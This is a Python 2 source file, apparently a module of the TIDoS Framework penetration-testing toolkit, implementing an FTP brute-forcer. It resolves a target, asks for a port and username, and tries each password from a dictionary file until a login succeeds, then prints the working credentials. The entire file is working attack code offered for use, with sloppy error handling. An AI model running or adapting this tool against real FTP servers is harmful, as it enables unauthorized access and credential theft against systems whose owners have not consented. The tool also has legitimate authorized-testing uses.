#!/usr/bin/env python2
#-*- coding: utf-8 -*-

#-:-:-:-:-:-:-:-:-:-:-:-:#
#    TIDoS Framework     #
#-:-:-:-:-:-:-:-:-:-:-:-:#

#Author : @_tID
#This module requires TIDoS Framework
#https://github.com/the-Infected-Drake/TIDoS-Framework 

import ftplib
import time
import socket
from colors import *
from ftplib import FTP

def ftpbrute(web):

	web = web.replace('http://','')
	web = web.replace('https://','')
	print R+'\n   ==============================='
	print R+'    F T P   B R U T E F O R C E R'
	print R+'   ===============================\n'
	try:
	    print GR+' [*] Testing target...'
	    ip = socket.gethostbyname(web)
	    print G+' [+] Target appears online...'
	    port = raw_input(GR+' [#] Enter the port (eg. 21) :> ')
	    user = raw_input(GR+' [#] Enter the default username (eg. root/admin) :> ')
	    ftp = FTP()
	    ftp.connect(ip,int(port)) 

	    with open('files/pass.dicc','r') as passwords:
		for password in passwords:
			password=password.replace("\n","")
			try:
				ftp.login(str(user),password)
				if True:
					print G+' [!] Successful login with ' +O+user+G+ ' and ' +O+password
					break
			except:
	    			print C+' [!] Checking '+B+user+C+' and '+B+password

	except:
	    print R+' [-] Target seems to be down or port is closed!'

